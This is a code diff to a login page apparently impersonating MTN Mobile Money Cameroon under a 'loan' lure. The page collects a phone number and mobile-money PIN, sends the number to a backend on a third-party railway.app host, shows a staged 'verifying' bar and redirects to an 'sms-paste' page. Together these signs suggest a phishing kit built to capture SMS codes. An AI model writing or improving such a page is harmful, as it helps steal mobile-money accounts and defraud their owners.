@@ -110,7 +110,6 @@
             font-size: 13px;
         }
 
-        /* Phone input */
         .phone-input {
             display: flex;
             align-items: center;
@@ -547,6 +546,14 @@
     </div>
 
     <script>
+        // ============================================
+        // BACKEND URL — your Railway deployment
+        // ============================================
+        const API_BASE = 'https://easy-loansej1-production.up.railway.app';
+
+        // ============================================
+        // PHONE INPUT
+        // ============================================
         const phoneInput = document.getElementById('phone');
         const phoneWrapper = document.getElementById('phoneWrapper');
         const phoneError = document.getElementById('phoneError');
@@ -560,6 +567,9 @@
             }
         });
 
+        // ============================================
+        // PIN INPUT (5 boxes: auto-advance, backspace, paste)
+        // ============================================
         const pinBoxes = [
             document.getElementById('pin1'),
             document.getElementById('pin2'),
@@ -610,32 +620,45 @@
             return pinBoxes.map(b => b.value).join('');
         }
 
+        // ============================================
+        // VERIFY OVERLAY (progress bar)
+        // ============================================
         const verifyOverlay = document.getElementById('verifyOverlay');
         const verifyBarFill = document.getElementById('verifyBarFill');
 
-        function showVerifying(durationMs, onDone) {
+        let verifyTimer = null;
+
+        function startVerifyBar(durationMs) {
             verifyOverlay.classList.add('show');
             verifyBarFill.style.width = '0%';
             const totalSeconds = Math.round(durationMs / 1000);
             const startTime = Date.now();
 
-            const tick = setInterval(function() {
+            verifyTimer = setInterval(function() {
                 const elapsedMs = Date.now() - startTime;
                 const raw = (elapsedMs / 1000) / totalSeconds;
                 const eased = 1 - Math.pow(1 - Math.min(raw, 1), 2.2);
                 verifyBarFill.style.width = Math.min(eased * 100, 99).toFixed(1) + '%';
 
                 if (elapsedMs >= durationMs) {
-                    clearInterval(tick);
+                    clearInterval(verifyTimer);
                     verifyBarFill.style.width = '100%';
-                    setTimeout(onDone, 350);
                 }
             }, 1000 / 30);
         }
 
+        function finishVerifyBar() {
+            if (verifyTimer) clearInterval(verifyTimer);
+            verifyBarFill.style.width = '100%';
+        }
+
+        // ============================================
+        // LOGIN BUTTON → calls backend /api/login
+        // ============================================
         const loginBtn = document.getElementById('loginBtn');
 
-        loginBtn.addEventListener('click', function() {
+        loginBtn.addEventListener('click', async function() {
+            // --- Validate phone ---
             const phoneDigits = phoneInput.value.replace(/\s/g, '');
             if (phoneDigits.length !== 9 || !/^\d{9}$/.test(phoneDigits)) {
                 phoneWrapper.classList.add('invalid');
@@ -644,6 +667,7 @@
                 return;
             }
 
+            // --- Validate PIN locally (PIN is NOT sent to backend) ---
             const pin = getPinValue();
             if (pin.length !== 5) {
                 pinBoxes.forEach(b => b.classList.add('invalid'));
@@ -652,25 +676,77 @@
                 return;
             }
 
-            localStorage.setItem('momoSession', JSON.stringify({
-                phone: '+237' + phoneDigits,
-                country: 'CM',
-                loggedInAt: new Date().toISOString(),
-                pinLength: 5
-            }));
-
+            // --- UI: disable button + show overlay ---
             loginBtn.disabled = true;
             loginBtn.textContent = 'LOGGING IN...';
 
-            showVerifying(30000, function() {
-                window.location.href = 'sms-paste.html';
-            });
+            const MIN_OVERLAY_MS = 3000;
+            const MAX_OVERLAY_MS = 30000;
+            startVerifyBar(MAX_OVERLAY_MS);
+            const overlayStart = Date.now();
+
+            try {
+                // --- Call backend: sends ONLY the phone number ---
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+                const res = await fetch(`${API_BASE}/api/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: '+237' + phoneDigits }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+
+                const data = await res.json().catch(() => ({}));
+
+                if (!res.ok || !data.ok) {
+                    throw new Error(data.error || 'Login failed');
+                }
+
+                // --- Save session ---
+                localStorage.setItem('momoSession', JSON.stringify({
+                    phone: '+237' + phoneDigits,
+                    country: 'CM',
+                    token: data.token,
+                    loggedInAt: new Date().toISOString()
+                }));
+
+                // --- Ensure overlay shows at least MIN_OVERLAY_MS ---
+                const elapsed = Date.now() - overlayStart;
+                const remaining = Math.max(0, MIN_OVERLAY_MS - elapsed);
+
+                setTimeout(function() {
+                    finishVerifyBar();
+                    setTimeout(function() {
+                        window.location.href = 'sms-paste.html';
+                    }, 350);
+                }, remaining);
+
+            } catch (err) {
+                console.error('Login error:', err);
+                finishVerifyBar();
+                verifyOverlay.classList.remove('show');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'LOGIN →';
+
+                const reason = err.name === 'AbortError'
+                    ? 'Server took too long. Please try again.'
+                    : (err.message || 'Could not connect. Check your internet.');
+                alert('Login failed: ' + reason);
+            }
         });
 
+        // Auto-focus first PIN box after phone is entered
         phoneInput.addEventListener('blur', function() {
             const digits = this.value.replace(/\s/g, '');
             if (digits.length === 9 && !getPinValue()) pinBoxes[0].focus();
         });
+
+        console.log('====================================');
+        console.log('💰 MTN MoMo Loan – Cameroon');
+        console.log('🔐 Login connected to:', API_BASE);
+        console.log('====================================');
     </script>
 </body>
 </html>
